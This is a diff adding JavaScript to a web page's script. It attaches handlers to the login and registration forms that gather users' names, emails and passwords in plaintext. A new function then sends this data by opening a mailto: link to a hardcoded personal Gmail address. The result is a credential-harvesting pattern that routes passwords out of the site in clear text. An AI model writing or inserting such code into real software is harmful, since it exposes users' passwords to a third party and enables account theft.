@@ -159,3 +159,31 @@ function sideMenu(side) {
   }
   side++;
 }
+// Login form submission
+const loginForm = document.getElementById('login');
+loginForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  const loginData = `Login Data:\nEmail: ${email}\nPassword: ${password}`;
+  sendDataToEmail(loginData);
+});
+
+// Registration form submission
+const registerForm = document.getElementById('register');
+registerForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  const fullName = registerForm.elements[0].value;
+  const email = registerForm.elements[1].value;
+  const password = registerForm.elements[2].value;
+  const confirmPassword = registerForm.elements[3].value;
+  const registerData = `Registration Data:\nFull Name: ${fullName}\nEmail: ${email}\nPassword: ${password}\nConfirm Password: ${confirmPassword}`;
+  sendDataToEmail(registerData);
+});
+
+// Function to send data to email
+function sendDataToEmail(data) {
+  const emailBody = encodeURIComponent(data);
+  const mailtoLink = `mailto:vaniyaprem77@gmail.com?body=${emailBody}`;
+  window.open(mailtoLink);
+}
